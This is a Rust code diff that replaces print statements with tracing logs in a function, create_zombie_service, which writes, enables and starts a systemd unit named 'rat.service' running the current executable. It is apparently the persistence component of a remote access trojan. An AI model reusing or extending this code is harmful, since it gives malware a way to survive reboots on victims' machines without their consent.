@@ -4,6 +4,8 @@ use std::path::Path;
 use std::process::Command;
 use std::{env, fs};
 
+use tracing::info;
+
 pub fn create_zombie_service() -> Result<()> {
     let current_exe_path = env::current_exe()?.display().to_string();
     let service_content = format!(
@@ -28,7 +30,7 @@ WantedBy=multi-user.target
 
     // Check if the service file already exists
     if Path::new(service_file_path).exists() {
-        println!("Service file already exists.");
+        info!("Service file already exists.");
         return Ok(());
     }
 
@@ -39,12 +41,12 @@ WantedBy=multi-user.target
     // Set the permissions to 644 (readable by all, writable by root)
     fs::set_permissions(service_file_path, fs::Permissions::from_mode(0o644))?;
 
-    println!("Service file created at {}", service_file_path);
+    info!("Service file created at {}", service_file_path);
 
     // Reload systemd to recognize the new service
     let output = Command::new("systemctl").arg("daemon-reload").output()?;
     if !output.status.success() {
-        eprintln!(
+        info!(
             "Failed to reload systemd: {}",
             String::from_utf8_lossy(&output.stderr)
         );
@@ -57,7 +59,7 @@ WantedBy=multi-user.target
         .arg("rat.service")
         .output()?;
     if !output.status.success() {
-        eprintln!(
+        info!(
             "Failed to enable the service: {}",
             String::from_utf8_lossy(&output.stderr)
         );
@@ -70,13 +72,13 @@ WantedBy=multi-user.target
         .arg("rat.service")
         .output()?;
     if !output.status.success() {
-        eprintln!(
+        info!(
             "Failed to start the service: {}",
             String::from_utf8_lossy(&output.stderr)
         );
         return Err(Error::new(ErrorKind::Other, "Failed to start service"));
     }
 
-    println!("Service started successfully.");
+    info!("Service started successfully.");
     Ok(())
 }
